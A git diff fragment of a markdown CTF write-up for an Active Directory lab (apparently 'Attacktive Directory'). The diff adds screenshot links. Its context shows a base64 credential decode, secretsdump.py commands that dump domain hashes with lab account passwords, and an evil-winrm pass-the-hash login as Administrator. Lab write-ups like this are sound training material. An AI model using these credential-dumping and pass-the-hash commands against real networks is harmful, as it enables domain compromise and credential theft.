@@ -139,20 +139,20 @@ echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
 ```bash
 secretsdump.py 'spookysec.local/svc-admin:management2005@10.10.143.217'
 ```
-![image alt]()
+![image alt](https://github.com/cyberprogramming1/-Attacktive-Directory-CTF/blob/936e08344f995cbdf1951de319542e70fbcb91d0/img/secret1.png)
 
 ```bash
 secretsdump.py 'spookysec.local/backup:backup2517860@10.10.143.217' 
 ```
-![image alt]()
+![image alt](https://github.com/cyberprogramming1/-Attacktive-Directory-CTF/blob/936e08344f995cbdf1951de319542e70fbcb91d0/img/secr2.png)
 
 # Pass the hash with evil-winrm
 
 ```bash
 evil-winrm -u Administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.50.82
 ```
-![image alt]()
-![image alt]()
-![image alt]()
-![image alt]()
-![image alt]()
+![image alt](https://github.com/cyberprogramming1/-Attacktive-Directory-CTF/blob/936e08344f995cbdf1951de319542e70fbcb91d0/img/evi1.png)
+![image alt](https://github.com/cyberprogramming1/-Attacktive-Directory-CTF/blob/936e08344f995cbdf1951de319542e70fbcb91d0/img/evil2.png)
+![image alt](https://github.com/cyberprogramming1/-Attacktive-Directory-CTF/blob/936e08344f995cbdf1951de319542e70fbcb91d0/img/evil3.png)
+![image alt](https://github.com/cyberprogramming1/-Attacktive-Directory-CTF/blob/936e08344f995cbdf1951de319542e70fbcb91d0/img/evil4.png)
+![image alt](https://github.com/cyberprogramming1/-Attacktive-Directory-CTF/blob/936e08344f995cbdf1951de319542e70fbcb91d0/img/son.png)
